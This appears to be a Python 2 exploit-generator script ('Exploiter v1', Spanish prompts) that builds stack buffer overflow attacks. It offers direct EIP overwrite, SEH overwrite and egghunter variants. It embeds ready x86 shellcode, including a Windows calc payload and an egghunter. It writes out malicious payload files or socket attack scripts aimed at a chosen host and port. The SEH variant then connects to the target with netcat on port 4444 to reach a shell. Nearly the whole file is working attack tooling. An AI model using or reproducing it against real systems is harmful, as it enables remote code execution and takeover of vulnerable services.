#!/usr/bin/python
# Code By @s1kr10s

import os

def cls():
	os.system("clear")
cls()

shellcode = ( 
"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
"\x1c\x39\xbd")
shellcodeof = ( 
'\n"\\xd9\\xcb\\xbe\\xb9\\x23\\x67\\x31\\xd9\\x74\\x24\\xf4\\x5a\\x29\\xc9"\n'
'"\\xb1\\x13\\x31\\x72\\x19\\x83\\xc2\\x04\\x03\\x72\\x15\\x5b\\xd6\\x56"\n'
'"\\xe3\\xc9\\x71\\xfa\\x62\\x81\\xe2\\x75\\x82\\x0b\\xb3\\xe1\\xc0\\xd9"\n'
'"\\x0b\\x61\\xa0\\x11\\xe7\\x03\\x41\\x84\\x7c\\xdb\\xd2\\xa8\\x9a\\x97"\n'
'"\\xba\\x68\\x10\\xfb\\x5b\\xe8\\xad\\x70\\x7b\\x28\\xb3\\x86\\x08\\x64"\n'
'"\\xac\\x52\\x0e\\x8d\\xdd\\x2d\\x3c\\x3c\\xa0\\xfc\\xbc\\x82\\x23\\xa8"\n'
'"\\xd7\\x94\\x6e\\x23\\xd9\\xe3\\x05\\xd4\\x05\\xf2\\x1b\\xe9\\x09\\x5a"\n'
'"\\x1c\\x39\\xbd"')
shellcodeCalc = (
"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
"\x57\x78\x01\xc2\x8b\x7a\x20\x01"
"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
"\x45\x81\x3e\x43\x72\x65\x61\x75"
"\xf2\x81\x7e\x08\x6f\x63\x65\x73"
"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
"\xb1\xff\x53\xe2\xfd\x68\x63\x61"
"\x6c\x63\x89\xe2\x52\x52\x53\x53"
"\x53\x53\x53\x53\x52\x53\xff\xd7")
egghunter = ('"\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\x6a\\x02\\x58\\xcd\\x2e\\x3c\\x05\\x5a\\x74"\n'
'"\\xef\\xb8\\x48\\x61\\x63\\x4b\\x8b\\xfa\\xaf\\x75\\xea\\xaf\\x75\\xe7\\xff\\xe7"')
'''*************************************************************'''
def msgError():
	print "No existe la opcion."

def Socket(buff, nops, eip, host, port, protocolo, shellcodeof):
	poc = """
import socket
from struct import *

buffer = 'A'*"""+buff+"""
eip    = pack('I',0x"""+eip+""")
nop	   = '\\x90'*"""+nops+"""
shell  = ("""+shellcodeof+""")

payload = buffer+eip+nop+shell+nop

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('"""+host+"""',"""+port+"""))
"""+protocolo+"""
sock.close()
"""
	textfile = open("DirectFileSock.py" , 'w')
	textfile.write(str(poc))
	textfile.close()
	cls()
	print "\nExploit Successfull...\n"
	print "Exploit    : DirectFileSock.py"
	print "Host Attack: "+host
	print "Port Attack: "+port+"\n"
'''*************************************************************'''
def SocketSeh(buff, nops, nseh, seh, host, port, protocolo, shellcodeof):
	poc = """
import socket
from struct import *

buffer = 'A'*"""+buff+"""
nseh   = pack('I',0x"""+nseh+""")
seh    = pack('I',0x"""+seh+""") #pop pop ret
nop	   = '\\x90'*"""+nops+"""
shell  = ("""+shellcodeof+""")

payload = buffer+nop+nseh+seh+nop+shell+nop

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('"""+host+"""',"""+port+"""))
"""+protocolo+"""
sock.close()
os.system("nc -vv "+target_address+" 4444")
"""
	textfile = open("DirectFileSockSeh.py" , 'w')
	textfile.write(str(poc))
	textfile.close()
	cls()
	print "\nExploit Successfull...\n"
	print "Exploit    : DirectFileSockSeh.py"
	print "Host Attack: "+host
	print "Port Attack: "+port+"\n"
'''*************************************************************'''
def SocketEgg(buff, nops, eip, host, port, protocolo, shellcodeof):
	poc = """
import socket
from struct import *

egghunter  = ("""+egghunter+""")

shell  = ("""+shellcodeof+""")
shell += "HacKHacK"+shell

buffer = 'A'*"""+buff+"""
eip    = pack('I',0x"""+eip+""") #CALL ESP, JMP ESP ?
nop	   = '\\x90'*"""+nops+"""

payload = buffer+eip+egghunter+nop

'''
#Si es necesario
payload  = "GET /"+payload+" HTTP/1.1\r\n"
payload += "Host: "+host+":"+port+"\r\n"
payload += "User-Agent: "+shell+"\r\n"
payload += "Connection: Keep-Alive\r\n\r\n"
'''

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('"""+host+"""',"""+port+"""))
"""+protocolo+"""
sock.close()
"""
	textfile = open("DirectFileSockEgg.py" , 'w')
	textfile.write(str(poc))
	textfile.close()
	cls()
	print "\nExploit Successfull...\n"
	print "Exploit    : DirectFileSockEgg.py"
	print "Host Attack: "+host
	print "Port Attack: "+port+"\n"
'''*************************************************************'''

def directFile():
	opcion  = raw_input("\nCrear (Socket [s] o File [f]): ")
	print "-------------------------------"
	buff  = raw_input("Bytes para Buffer: ")
	eip = raw_input("Direccion EIP (Ex: 10101010): ")
	nops = raw_input("Cantidad de Nops: ")
	
	buffer 	= "A"*int(buff)
	nop	= "\x90"*int(nops)

	if opcion == "f":
		print "-------------------------------"
		file  = raw_input("Nombre de Archivo: ")
		shell = raw_input("Usar ShellCode y/n: ")

		if shell == "y":
			payload = buffer+eip+nop+shellcode+nop
		elif shell == "n":
			payload = buffer+eip+nop+"\xcc"*200+nop

		textfile = open(file , 'w')
		textfile.write(payload)
		textfile.close()
	elif opcion == "s":
		print "-------------------------------"
		host  = raw_input("Host: ")
		port  = raw_input("Port: ")
		proto = raw_input("Protocolo (s/n): ")
		if proto == "s":
			prot = raw_input("Tipo protocolo: ")
			protocolo = "sock.send('"+prot+" '+payload+'\\r\\n')"
		else:
			protocolo = "sock.send(payload+'\\r\\n')"
		Socket(buff, nops, eip, host, port, protocolo, shellcodeof)


'''*************************************************************'''

def directSehFile ():
	opcion  = raw_input("\nCrear (SocketSeh [s] o FileSeh [f]): ")
	print "-------------------------------"
	buff  = raw_input("Bytes para Buffer: ")
	nseh = raw_input("Direccion Nseh (Ex: 0x10101010): ")
	seh = raw_input("Direccion Seh (Ex: 0x10101010): ")
	nops = raw_input("Cantidad de Nops: ")
	
	buffer 	= "A"*int(buff)
	nop	= "\x90"*int(nops)

	if opcion == "f":
		print "-------------------------------"
		file  = raw_input("Nombre de Archivo: ")
		shell = raw_input("Usar ShellCode y/n: ")

		if shell == "y":
			payload = buffer+nseh+seh+nop+shellcode+nop
		elif shell == "n":
			payload = buffer+nseh+seh+nop+"\xcc"*200+nop

		textfile = open(file , 'w')
		textfile.write(payload)
		textfile.close()
	elif opcion == "s":
		print "-------------------------------"
		host  = raw_input("Host: ")
		port  = raw_input("Port: ")
		proto = raw_input("Protocolo (s/n): ")
		if proto == "s":
			prot = raw_input("Tipo protocolo: ")
			protocolo = "sock.send('"+prot+" '+payload+'\\r\\n')"
		else:
			protocolo = "sock.send(payload+'\\r\\n')"
		SocketSeh(buff, nops, nseh, seh, host, port, protocolo, shellcodeof)

'''*************************************************************'''

def directEggFile ():
	opcion  = raw_input("\nCrear (SocketEgg [s] o FileEgg [f]): ")
	print "-------------------------------"
	buff  = raw_input("Bytes para Buffer: ")
	eip = raw_input("Direccion EIP (Ex: 10101010): ")
	nops = raw_input("Cantidad de Nops: ")
	
	buffer 	= "A"*int(buff)
	nop	= "\x90"*int(nops)

	if opcion == "f":
		print "-------------------------------"
		file  = raw_input("Nombre de Archivo: ")
		shell = raw_input("Usar ShellCode y/n: ")

		if shell == "y":
			payload = buffer+eip+nop+shellcode+nop
		elif shell == "n":
			payload = buffer+eip+nop+"\xcc"*200+nop

		textfile = open(file , 'w')
		textfile.write(payload)
		textfile.close()
	elif opcion == "s":
		print "-------------------------------"
		host  = raw_input("Host: ")
		port  = raw_input("Port: ")
		proto = raw_input("Protocolo (s/n): ")
		if proto == "s":
			prot = raw_input("Tipo protocolo: ")
			protocolo = "sock.send('"+prot+" '+payload+'\\r\\n')"
		else:
			protocolo = "sock.send(payload+'\\r\\n')"
		SocketEgg(buff, nops, eip, host, port, protocolo, shellcodeof)

'''*************************************************************'''

def badCodes():
	i = ''
	stringBad = ("\\x00","\\x01","\\x02","\\x03","\\x04","\\x05","\\x06","\\x07","\\x08","\\x09","\\x0a","\\x0b","\\x0c","\\x0d","\\x0e","\\x0f","\\x10","\\x11","\\x12","\\x13","\\x14","\\x15","\\x16","\\x17","\\x18","\\x19","\\x1a","\\x1b","\\x1c","\\x1d","\\x1e","\\x1f"
,"\\x20","\\x21","\\x22","\\x23","\\x24","\\x25","\\x26","\\x27","\\x28","\\x29","\\x2a","\\x2b","\\x2c","\\x2d","\\x2e","\\x2f","\\x30","\\x31","\\x32","\\x33","\\x34","\\x35","\\x36","\\x37","\\x38","\\x39","\\x3a","\\x3b","\\x3c","\\x3d","\\x3e","\\x3f"
,"\\x40","\\x41","\\x42","\\x43","\\x44","\\x45","\\x46","\\x47","\\x48","\\x49","\\x4a","\\x4b","\\x4c","\\x4d","\\x4e","\\x4f","\\x50","\\x51","\\x52","\\x53","\\x54","\\x55","\\x56","\\x57","\\x58","\\x59","\\x5a","\\x5b","\\x5c","\\x5d","\\x5e","\\x5f"
,"\\x60","\\x61","\\x62","\\x63","\\x64","\\x65","\\x66","\\x67","\\x68","\\x69","\\x6a","\\x6b","\\x6c","\\x6d","\\x6e","\\x6f","\\x70","\\x71","\\x72","\\x73","\\x74","\\x75","\\x76","\\x77","\\x78","\\x79","\\x7a","\\x7b","\\x7c","\\x7d","\\x7e","\\x7f"
,"\\x80","\\x81","\\x82","\\x83","\\x84","\\x85","\\x86","\\x87","\\x88","\\x89","\\x8a","\\x8b","\\x8c","\\x8d","\\x8e","\\x8f","\\x90","\\x91","\\x92","\\x93","\\x94","\\x95","\\x96","\\x97","\\x98","\\x99","\\x9a","\\x9b","\\x9c","\\x9d","\\x9e","\\x9f"
,"\\xa0","\\xa1","\\xa2","\\xa3","\\xa4","\\xa5","\\xa6","\\xa7","\\xa8","\\xa9","\\xaa","\\xab","\\xac","\\xad","\\xae","\\xaf","\\xb0","\\xb1","\\xb2","\\xb3","\\xb4","\\xb5","\\xb6","\\xb7","\\xb8","\\xb9","\\xba","\\xbb","\\xbc","\\xbd","\\xbe","\\xbf"
,"\\xc0","\\xc1","\\xc2","\\xc3","\\xc4","\\xc5","\\xc6","\\xc7","\\xc8","\\xc9","\\xca","\\xcb","\\xcc","\\xcd","\\xce","\\xcf","\\xd0","\\xd1","\\xd2","\\xd3","\\xd4","\\xd5","\\xd6","\\xd7","\\xd8","\\xd9","\\xda","\\xdb","\\xdc","\\xdd","\\xde","\\xdf"
,"\\xe0","\\xe1","\\xe2","\\xe3","\\xe4","\\xe5","\\xe6","\\xe7","\\xe8","\\xe9","\\xea","\\xeb","\\xec","\\xed","\\xee","\\xef","\\xf0","\\xf1","\\xf2","\\xf3","\\xf4","\\xf5","\\xf6","\\xf7","\\xf8","\\xf9","\\xfa","\\xfb","\\xfc","\\xfd","\\xfe","\\xff")
	
	for i,b in enumerate(stringBad):
		print stringBad[i]





'''*************************************************************'''

print "Exploiter v1\n"
opciones = raw_input("(1)=SOCK\n(2)=SOCK_SEH\n(3)=SOCK_EGG\n(4)=BADCODE\n\n\nTipo -> ")
if opciones == "1":
	directFile()
elif opciones == "2":
	directSehFile()
elif opciones == "3":
	directEggFile()
elif opciones == "4":
	badCodes()
